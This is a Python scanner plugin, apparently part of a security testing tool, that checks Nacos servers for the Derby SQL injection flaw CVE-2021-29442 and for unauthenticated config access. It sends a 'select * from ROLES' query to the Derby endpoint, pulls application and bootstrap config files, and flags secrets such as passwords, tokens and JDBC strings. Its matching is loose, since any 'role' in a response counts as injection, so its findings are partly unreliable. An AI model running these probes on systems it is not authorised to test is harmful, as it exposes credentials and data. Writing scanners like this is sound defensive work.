from app.scanner.base import BaseScanner
from app.scanner.loader import register_scanner
from app.utils.http_client import http_request
from app.utils.logger import get_logger

logger = get_logger("nacos_rce")


@register_scanner
class NacosRCEScanner(BaseScanner):
    name = "Nacos Derby SQL注入RCE (CVE-2021-29442)"
    description = "Nacos内嵌Derby数据库存在SQL注入，可实现RCE"
    category = "nacos"
    module = "nacos_rce"
    risk_level = "critical"
    risk_score = 9
    cve_ids = ["CVE-2021-29442"]
    references = [
        "https://nvd.nist.gov/vuln/detail/CVE-2021-29442",
    ]
    fix_suggestion = "升级Nacos至2.2.0+，使用外置MySQL数据库替代Derby"

    def check(self) -> bool:
        found = False

        derby_paths = [
            "/nacos/v1/cs/derby?sql=select+*+from+ROLES",
            "/nacos/v1/console/health",
        ]

        for path in derby_paths:
            url = f"{self.target}{path}"
            resp = http_request("GET", url)
            if resp is None:
                continue

            if "DERBY" in resp.text or "derby" in resp.text:
                self.add_result(
                    name="Nacos内嵌Derby数据库暴露",
                    risk_level="high",
                    risk_score=8,
                    target_url=url,
                    detail="Nacos使用内嵌Derby数据库，可能存在SQL注入RCE",
                    response_snippet=resp.text[:500],
                    evidence="响应中包含Derby相关信息",
                )
                found = True

            if "select * from ROLES" in resp.text or "role" in resp.text.lower():
                self.add_result(
                    name="Nacos Derby SQL注入",
                    risk_level="critical",
                    risk_score=9,
                    target_url=url,
                    detail="Nacos Derby数据库SQL注入可获取敏感数据",
                    payload="select * from ROLES",
                    response_snippet=resp.text[:500],
                    evidence="SQL查询成功返回数据",
                )
                found = True

        yaml_paths = [
            "/nacos/v1/cs/configs?dataId=application.yaml&group=DEFAULT_GROUP",
            "/nacos/v1/cs/configs?dataId=application.properties&group=DEFAULT_GROUP",
            "/nacos/v1/cs/configs?dataId=bootstrap.yaml&group=DEFAULT_GROUP",
        ]

        for path in yaml_paths:
            url = f"{self.target}{path}"
            resp = http_request("GET", url)
            if resp is None or resp.status_code != 200:
                continue

            sensitive_keywords = ["password", "secret", "token", "datasource", "jdbc", "redis", "mysql"]
            leaked = [kw for kw in sensitive_keywords if kw in resp.text.lower()]
            if leaked:
                self.add_result(
                    name="Nacos配置文件敏感信息泄露",
                    risk_level="high",
                    risk_score=7,
                    target_url=url,
                    detail=f"Nacos配置文件未授权访问，泄露敏感字段: {', '.join(leaked)}",
                    response_snippet=resp.text[:500],
                    evidence=f"配置文件包含敏感信息: {', '.join(leaked)}",
                )
                found = True

        return found
